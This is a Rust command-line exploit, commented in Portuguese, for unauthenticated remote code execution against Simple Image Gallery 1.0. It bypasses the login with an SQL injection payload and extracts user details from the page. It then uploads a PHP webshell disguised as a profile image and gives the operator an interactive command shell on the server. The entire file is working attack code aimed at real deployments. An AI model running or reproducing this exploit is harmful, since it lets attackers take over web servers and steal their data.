use clap::{App, Arg};
use colored::*;
use rand::{Rng, distributions::Alphanumeric};
use reqwest::blocking::{Client, multipart};
use scraper::{Html, Selector};
use std::collections::HashMap;
use std::error::Error;
use std::io::{self, Write};

fn main() {
    // Configuração dos argumentos de linha de comando usando clap
    let matches = App::new("Simple Image Gallery Exploit")
        .version("1.0")
        .about("Exploit para Simple Image Gallery 1.0 - Remote Code Execution (Não autenticado)")
        .arg(
            Arg::with_name("url")
                .short("u")
                .long("url")
                .value_name("URL")
                .help("URL alvo (ex: http://alvo")
                .takes_value(true)
                .required(true),
        )
        .get_matches();

    // Obter URL alvo e formata-la corretamente
    let mut url = matches.value_of("url").unwrap().to_string();
    if !url.starts_with("http://") && !url.starts_with("https://") {
        url = format!("http://{}", url);
    }
    if !url.ends_with('/') {
        url.push('/');
    }

    println!(
        "{} {}",
        "[+]".green().bold(),
        "Simple Image Gallery 1.0 - Execução Remota de Código (RCE) Exploit".bold()
    );
    println!("{} {}", "[+]".green(), format!("Alvo: {}", url).bold());

    // Criar cliente HTTP com suporte a cookies
    let client = Client::builder()
        .cookie_store(true)
        .build()
        .expect("Falha ao criar cliente HTTP");

    // Executar etapas do exploit
    match exploit(&client, &url) {
        Ok(_) => println!(
            "{} {}",
            "[+]".green().bold(),
            "Exploit concluído com sucesso!".bold()
        ),
        Err(e) => {
            println!(
                "{} {}",
                "[+]".red().bold(),
                format!("Falha no exploit: {}", e).bold()
            );
            std::process::exit(1);
        }
    }
}

fn exploit(client: &Client, url: &str) -> Result<(), Box<dyn Error>> {
    println!(
        "{} {}",
        "[+]".green(),
        "Tentando bypass de login por injeção SQL...".bold()
    );

    // Tentativa de bypass de login
    let login_url = format!("{}classes/Login.php?f=login", url);
    let mut login_data = HashMap::new();
    login_data.insert("username", "admin' or '1'='1'#");
    login_data.insert("password", "");

    let login_resp = client.post(&login_url).form(&login_data).send()?;

    let json_resp: serde_json::Value = serde_json::from_str(&login_resp.text()?)?;
    let status = json_resp["status"].as_str().unwrap_or("");

    if status != "success" {
        return Err("Falha no bypass de login".into());
    }
    println!(
        "{} {}",
        "[+]".green(),
        "Bypass de login bem-sucedido!".bold()
    );

    // Gerar nome aleatório para o shell
    let shell_name = generate_shell_name();
    println!(
        "{} {}",
        "[+]".green(),
        format!("Nome do shell gerado: {}", shell_name).bold()
    );

    // Obter informações do usuário
    println!(
        "{} {}",
        "[+]".green(),
        "Recuperando informações do usuário...".bold()
    );
    let user_page_url = format!("{}?page=user", url);
    let user_page_resp = client.get(&user_page_url).send()?;
    let user_page_html = user_page_resp.text()?;
    let user_info = extract_user_info(&user_page_html)?;

    println!("{} {}", "[+]".green(), "Informações do usuário:".bold());
    println!("  {}: {}", "ID do Usuário".blue(), user_info.id);
    println!("  {}: {}", "Nome".blue(), user_info.firstname);
    println!("  {}: {}", "Sobrenome".blue(), user_info.lastname);
    println!("  {}: {}", "Nome de Usuário".blue(), user_info.username);

    // Fazer upload do shell
    println!("{} {}", "[+]".green(), "Enviando webshell...".bold());
    let shell_url = upload_shell(client, url, &shell_name, &user_info)?;
    println!(
        "{} {}",
        "[+]".green(),
        "Webshell enviado com sucesso!".bold()
    );
    println!(
        "{} {}",
        "[+]".green(),
        format!("URL do Shell: {}", shell_url).bold()
    );

    // Executar comandos via webshell
    execute_commands(client, &shell_url)?;

    Ok(())
}

struct UserInfo {
    id: String,
    firstname: String,
    lastname: String,
    username: String,
}

fn extract_user_info(html: &str) -> Result<UserInfo, Box<dyn Error>> {
    let document = Html::parse_document(html);

    // Criar seletores para cada campo
    let id_selector = Selector::parse("input[name='id']").unwrap();
    let firstname_selector = Selector::parse("input#firstname").unwrap();
    let lastname_selector = Selector::parse("input#lastname").unwrap();
    let username_selector = Selector::parse("input#username").unwrap();

    // Extrair valores
    let id = document
        .select(&id_selector)
        .next()
        .ok_or("Campo ID não encontrado")?
        .value()
        .attr("value")
        .ok_or("Valor de ID não encontrado")?
        .to_string();

    let firstname = document
        .select(&firstname_selector)
        .next()
        .ok_or("Campo de nome não encontrado")?
        .value()
        .attr("value")
        .ok_or("Valor de nome não encontrado")?
        .to_string();

    let lastname = document
        .select(&lastname_selector)
        .next()
        .ok_or("Campo de sobrenome não encontrado")?
        .value()
        .attr("value")
        .ok_or("Valor de sobrenome não encontrado")?
        .to_string();

    let username = document
        .select(&username_selector)
        .next()
        .ok_or("Campo de nome de usuário não encontrado")?
        .value()
        .attr("value")
        .ok_or("Valor de nome de usuário não encontrado")?
        .to_string();

    Ok(UserInfo {
        id,
        firstname,
        lastname,
        username,
    })
}

fn generate_shell_name() -> String {
    let rand_string: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(15)
        .map(char::from)
        .collect();
    rand_string
}

fn upload_shell(
    client: &Client,
    url: &str,
    shell_name: &str,
    user_info: &UserInfo,
) -> Result<String, Box<dyn Error>> {
    let upload_url = format!("{}classes/Users.php?f=save", url);
    let payload = "<?php if(isset($_GET['cmd'])){ $cmd = ($_GET['cmd']); system($cmd); die;} ?>";

    // Criar formulário multipart
    let form = multipart::Form::new()
        .text("id", user_info.id.clone())
        .text("firstname", user_info.firstname.clone())
        .text("lastname", user_info.lastname.clone())
        .text("username", user_info.username.clone())
        .text("password", "")
        .part(
            "img",
            multipart::Part::bytes(payload.as_bytes().to_vec())
                .file_name(format!("{}.php", shell_name))
                .mime_str("application/octet-stream")?,
        );

    let upload_resp = client.post(&upload_url).multipart(form).send()?;

    let response_text = upload_resp.text()?;

    if response_text == "1" {
        // Obter URL do shell
        let user_page_url = format!("{}?page=user", url);
        let user_page_resp = client.get(&user_page_url).send()?;
        let user_page_html = user_page_resp.text()?;

        let document = Html::parse_document(&user_page_html);
        let img_selector = Selector::parse("img#cimg").unwrap();

        let shell_url = document
            .select(&img_selector)
            .next()
            .ok_or("URL do shell não encontrada")?
            .value()
            .attr("src")
            .ok_or("Atributo src do shell não encontrado")?
            .to_string();

        Ok(shell_url)
    } else {
        Err("Falha no upload do shell".into())
    }
}

fn execute_commands(client: &Client, shell_url: &str) -> Result<(), Box<dyn Error>> {
    println!(
        "{} {}",
        "[+]".green(),
        "Testando shell com o comando 'whoami'...".bold()
    );

    // Testar shell com comando inicial
    let test_url = format!("{}?cmd=whoami", shell_url);
    let test_resp = client.get(&test_url).send()?;

    if test_resp.status().is_success() {
        print!("{}", test_resp.text()?);
        println!(
            "{} {}",
            "[+]".green(),
            "Webshell ativo! Iniciando shell interativo...".bold()
        );
    } else {
        return Err("Teste do webshell falhou".into());
    }

    // Loop interativo de comandos
    loop {
        let cmd = input("$ ");
        if cmd == "exit" {
            println!("{} {}", "[+]".yellow(), "Saindo do shell...".bold());
            break;
        }

        let exec_url = format!("{}?cmd={}", shell_url, cmd);
        match client.get(&exec_url).send() {
            Ok(resp) => print!("{}", resp.text()?),
            Err(e) => println!(
                "{} {}",
                "[x]".red(),
                format!("Comando falhou: {}", e).bold()
            ),
        }
    }

    Ok(())
}

fn input(prompt: &str) -> String {
    print!("{}", prompt.cyan().bold());
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}
